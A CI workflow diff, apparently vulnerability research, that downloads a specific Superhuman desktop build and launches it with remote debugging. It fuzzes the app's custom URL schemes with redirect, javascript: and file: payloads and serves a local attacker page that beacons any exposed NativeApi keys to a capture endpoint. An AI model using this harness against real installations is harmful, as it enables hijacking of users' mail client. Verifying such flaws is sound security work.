@@ -1,0 +1,198 @@
+name: Temporary Superhuman desktop custom-protocol runtime gate
+
+on:
+  push:
+    branches: [research/superhuman-desktop-20260808]
+    paths: [.github/workflows/superhuman-desktop-custom-protocol-runtime-gate-20260808.yml]
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  gate:
+    runs-on: macos-15
+    timeout-minutes: 25
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Download and verify exact official desktop build
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf protocol-gate
+          mkdir -p protocol-gate/raw protocol-gate/evidence protocol-gate/site protocol-gate/home protocol-gate/profile
+          URL='https://storage.googleapis.com/download.superhuman.com/supertron-update/Superhuman-1041.0.29-latest-mac.zip'
+          curl --fail --show-error --silent --location --retry 4 --retry-all-errors "$URL" -o protocol-gate/raw/release.zip
+          echo '5b753f4c31dd0e5732f0e555bbd76e595c573445bf93b91fd25320e29bf2f014  protocol-gate/raw/release.zip' | shasum -a 256 -c -
+          ditto -x -k protocol-gate/raw/release.zip protocol-gate/raw/unpacked
+          APP="$(find protocol-gate/raw/unpacked -name 'Superhuman.app' -type d | head -1)"
+          test -n "$APP"
+          printf '%s\n' "$APP" > protocol-gate/evidence/app-path.txt
+          cp "$APP/Contents/Info.plist" protocol-gate/evidence/Info.plist
+          plutil -convert json -o protocol-gate/evidence/Info.json "$APP/Contents/Info.plist"
+          xattr -dr com.apple.quarantine "$APP" || true
+          /System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f "$APP" || true
+
+      - name: Start local attacker page and exact app
+        shell: bash
+        run: |
+          set -euo pipefail
+          cd protocol-gate
+          cat > site/server.py <<'PY'
+          from http.server import BaseHTTPRequestHandler,HTTPServer
+          from pathlib import Path
+          import json, urllib.parse, time
+          LOG=Path('../evidence/http-events.jsonl')
+          HTML=b'''<!doctype html><meta charset="utf-8"><title>synthetic attacker page</title><script>
+          (async()=>{let x={href:location.href,nativeApi:!!globalThis.NativeApi,nativeKeys:Object.keys(globalThis.NativeApi||{}),timestamp:Date.now()};
+          try{await fetch('/capture?d='+encodeURIComponent(JSON.stringify(x)))}catch(e){}
+          document.body.textContent=JSON.stringify(x)})();</script>'''
+          class H(BaseHTTPRequestHandler):
+            def log(self,event):
+              with LOG.open('a') as f:f.write(json.dumps({'time':time.time(),'event':event,'path':self.path,'headers':dict(self.headers)})+'\n')
+            def do_GET(self):
+              self.log('GET')
+              if self.path.startswith('/capture'):
+                self.send_response(204);self.end_headers();return
+              self.send_response(200);self.send_header('content-type','text/html');self.end_headers();self.wfile.write(HTML)
+            def log_message(self,*a):pass
+          HTTPServer(('127.0.0.1',8765),H).serve_forever()
+          PY
+          python3 site/server.py > evidence/http-server.log 2>&1 &
+          SERVER_PID=$!
+          APP="$(cat evidence/app-path.txt)"
+          BIN="$APP/Contents/MacOS/Superhuman"
+          export HOME="$PWD/home"
+          export ELECTRON_ENABLE_LOGGING=1
+          export ELECTRON_ENABLE_STACK_DUMPING=1
+          "$BIN" --user-data-dir="$PWD/profile" --remote-debugging-port=9222 --enable-logging=file --log-file="$PWD/evidence/electron.log" > evidence/stdout.log 2> evidence/stderr.log &
+          APP_PID=$!
+          printf '%s\n' "$APP_PID" > evidence/app-pid.txt
+          printf '%s\n' "$SERVER_PID" > evidence/server-pid.txt
+          for _ in $(seq 1 120); do curl -fsS http://127.0.0.1:9222/json/version > evidence/cdp-version.json && break; sleep .25; done
+          # CDP may be unavailable before login UI initializes; this is recorded, not assumed.
+          ps -p "$APP_PID" -o pid,ppid,command > evidence/process.txt || true
+
+      - name: Generate registered-scheme cases and dispatch them
+        shell: bash
+        run: |
+          set -euo pipefail
+          cd protocol-gate
+          python3 - <<'PY'
+          from pathlib import Path
+          import json,urllib.parse
+          info=json.loads(Path('evidence/Info.json').read_text())
+          schemes=[]
+          for row in info.get('CFBundleURLTypes',[]) or []:
+            for s in row.get('CFBundleURLSchemes',[]) or []:
+              if s not in schemes: schemes.append(s)
+          if not schemes: schemes=['superhuman']
+          target='http://127.0.0.1:8765/sentinel'
+          keys=['url','redirect','redirect_uri','returnUrl','return_url','callback','next','continue','target','state','code','provider','loginUuid','login_uuid']
+          paths=['callback','oauth','login','open','auth','settings','']
+          cases=[]
+          for scheme in schemes:
+            for path in paths:
+              cases.append(f'{scheme}://{path}')
+            for key in keys:
+              val=urllib.parse.quote(target,safe='')
+              for path in ['callback','oauth','login','open']:
+                cases.append(f'{scheme}://{path}?{key}={val}&probe=SUPERHUMAN_PROTOCOL_20260808')
+              cases.append(f'{scheme}://callback?{key}=javascript%3Aalert%281%29')
+              cases.append(f'{scheme}://callback?{key}=file%3A%2F%2F%2Ftmp%2Fsh-probe')
+            # delimiter/parser confusion controls
+            cases += [
+              f'{scheme}://callback@127.0.0.1:8765/sentinel',
+              f'{scheme}://callback%2F%2F127.0.0.1:8765/sentinel',
+              f'{scheme}:http://127.0.0.1:8765/sentinel',
+              f'{scheme}://callback?code=LAB_ONLY&state=http%3A%2F%2F127.0.0.1%3A8765%2Fsentinel',
+            ]
+          Path('evidence/schemes.json').write_text(json.dumps(schemes,indent=2)+'\n')
+          Path('evidence/cases.json').write_text(json.dumps(cases,indent=2)+'\n')
+          PY
+          : > evidence/dispatch.tsv
+          i=0
+          while IFS= read -r url; do
+            i=$((i+1))
+            before=$(wc -l < evidence/http-events.jsonl 2>/dev/null || echo 0)
+            start=$(date +%s)
+            set +e
+            open "$url" >"evidence/open-$i.out" 2>"evidence/open-$i.err"
+            rc=$?
+            set -e
+            sleep 0.7
+            after=$(wc -l < evidence/http-events.jsonl 2>/dev/null || echo 0)
+            cdp_count=0
+            if curl -fsS http://127.0.0.1:9222/json/list > "evidence/cdp-$i.json" 2>/dev/null; then
+              cdp_count=$(python3 -c 'import json,sys;print(len(json.load(open(sys.argv[1]))))' "evidence/cdp-$i.json" 2>/dev/null || echo 0)
+            fi
+            printf '%s\t%s\t%s\t%s\t%s\t%s\n' "$i" "$rc" "$before" "$after" "$cdp_count" "$url" >> evidence/dispatch.tsv
+          done < <(python3 -c 'import json;print("\n".join(json.load(open("evidence/cases.json"))))')
+          # random unregistered scheme negative control
+          open 'shsyntheticinvalid20260808://open?url=http%3A%2F%2F127.0.0.1%3A8765%2Fnegative' > evidence/negative.out 2> evidence/negative.err || true
+          sleep 1
+
+      - name: Evaluate exact-runtime effects
+        if: always()
+        shell: bash
+        run: |
+          set -euo pipefail
+          cd protocol-gate
+          python3 - <<'PY'
+          from pathlib import Path
+          import csv,json,urllib.parse,hashlib,os,glob
+          rows=[]
+          p=Path('evidence/dispatch.tsv')
+          if p.exists():
+            for row in csv.reader(p.open(),delimiter='\t'):
+              if len(row)>=6:
+                rows.append({'index':int(row[0]),'openRc':int(row[1]),'httpBefore':int(row[2]),'httpAfter':int(row[3]),'cdpTargetCount':int(row[4]),'url':row[5]})
+          events=[]
+          ep=Path('evidence/http-events.jsonl')
+          if ep.exists():
+            for line in ep.read_text(errors='ignore').splitlines():
+              try:events.append(json.loads(line))
+              except:pass
+          captures=[]
+          for e in events:
+            if str(e.get('path','')).startswith('/capture'):
+              try:
+                q=urllib.parse.parse_qs(urllib.parse.urlsplit(e['path']).query);captures.append(json.loads(q.get('d',['{}'])[0]))
+              except Exception as ex:captures.append({'parseError':repr(ex),'path':e.get('path')})
+          targets=[]
+          for fn in glob.glob('evidence/cdp-*.json'):
+            try:
+              for t in json.load(open(fn)):
+                u=str(t.get('url',''))
+                if u.startswith('http://127.0.0.1:8765'):
+                  targets.append({'file':fn,'type':t.get('type'),'url':u,'title':t.get('title')})
+            except:pass
+          native=[c for c in captures if c.get('nativeApi') or c.get('nativeKeys')]
+          result={
+            'workflowRunId':int(os.environ['GITHUB_RUN_ID']),
+            'sourceCommit':os.environ['GITHUB_SHA'],
+            'desktopVersion':'1041.0.29',
+            'releaseSha256':'5b753f4c31dd0e5732f0e555bbd76e595c573445bf93b91fd25320e29bf2f014',
+            'caseCount':len(rows),'httpEventCount':len(events),'captureCount':len(captures),
+            'localAttackerTargets':targets,'captures':captures,'nativeApiCaptures':native,
+            'arbitraryAttackerPageLoadedInApp':bool(targets),
+            'privilegedPreloadOnAttackerPage':bool(native),
+            'pass':bool(targets and native),
+          }
+          Path('evidence/RESULT.json').write_text(json.dumps(result,indent=2)+'\n')
+          PY
+          cat evidence/RESULT.json
+          find evidence -type f -print0 | sort -z | xargs -0 shasum -a 256 > evidence/SHA256SUMS.txt
+          kill "$(cat evidence/app-pid.txt)" "$(cat evidence/server-pid.txt)" 2>/dev/null || true
+          jq -e '.pass == true' evidence/RESULT.json >/dev/null
+
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: superhuman-desktop-custom-protocol-runtime-gate
+          path: protocol-gate/evidence/
+          if-no-files-found: warn
+          retention-days: 1
+          compression-level: 9
